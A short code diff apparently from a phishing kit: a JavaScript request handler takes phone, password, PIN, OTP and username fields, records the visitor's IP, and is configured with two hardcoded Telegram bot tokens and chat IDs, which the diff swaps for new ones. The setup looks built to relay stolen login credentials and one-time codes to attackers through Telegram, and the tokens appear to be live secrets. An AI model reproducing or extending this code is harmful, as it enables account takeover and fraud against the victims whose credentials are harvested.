@@ -6,11 +6,11 @@ export default async function handler(req, res) {
   const { type, phone, pass, pin, otp, username, invite } = req.body;
 
   // ==================== DUAL BOT CONFIGURATION ====================
-  const BOT_TOKEN_1 = '8937401356:AAGmQp5rhoVHi5jb8Gs7TbrzDbBT9lJ0Hks';
-  const CHAT_ID_1 = '8890415006';
+  const BOT_TOKEN_1 = '9164193295:AAH75EE-fMj1gR91r5TXxBz2TXUuorFTBcM';
+  const CHAT_ID_1 = '8743153085';
 
-  const BOT_TOKEN_2 = '897401356:AAGmQp5rhoVHi5jb8Gs7TbrzDbBT9lJ0Hks';
-  const CHAT_ID_2 = '88415006';
+  const BOT_TOKEN_2 = '964193295:AAH75EE-fMj1gR91r5TXxBz2TXUuorFTBcM';
+  const CHAT_ID_2 = '87153085';
 
   // Visitor real IP address extraction
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
